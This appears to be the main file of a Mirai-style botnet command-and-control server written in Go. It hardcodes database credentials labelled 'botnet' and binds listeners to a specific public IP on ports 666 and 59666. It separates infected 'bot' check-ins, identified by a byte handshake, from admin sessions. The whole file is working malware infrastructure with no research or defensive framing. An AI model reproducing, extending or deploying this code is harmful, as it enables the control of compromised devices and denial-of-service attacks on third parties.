package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "botnet"
const DatabasePass string   = "net"
const DatabaseTable string  = "cosmic"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    // Listen on port 666
    tel, err := net.Listen("tcp", "185.247.117.214:666")
    if err != nil {
        fmt.Println(err)
        return
    }
    
    // Also listen on port 59666 for bot connections
    tel2, err := net.Listen("tcp", "185.247.117.214:59666")
    if err != nil {
        fmt.Println(err)
        return
    }

    // Handle connections on port 666
    go func() {
        for {
            conn, err := tel.Accept()
            if err != nil {
                break
            }
            go initialHandler(conn)
        }
    }()
    
    // Handle connections on port 59666
    go func() {
        for {
            conn, err := tel2.Accept()
            if err != nil {
                break
            }
            go initialHandler(conn)
        }
    }()
    
    // Keep main thread alive
    select {}

    fmt.Println("ERROR: run ulimit -n 999999")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    // Increase timeout for bot connections
    conn.SetDeadline(time.Now().Add(30 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        fmt.Printf("Connection read failed: %v (bytes: %d)\n", err, l)
        return
    }

    // Debug: Log what we received
    fmt.Printf("Received %d bytes: %x\n", l, buf[:l])

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        version := buf[3]
        fmt.Printf("Bot connection detected, version: %d\n", version)
        
        if version > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                fmt.Printf("Failed to read source length: %v\n", err)
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    fmt.Printf("Failed to read source string: %v\n", err)
                    return
                }
                source = string(source_buf)
            }
            fmt.Printf("Bot source: '%s'\n", source)
            NewBot(conn, version, source).Handle()
        } else {
            NewBot(conn, version, "").Handle()
        }
    } else {
        fmt.Printf("Admin connection detected\n")
        NewAdmin(conn).Handle()
    }
}


func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
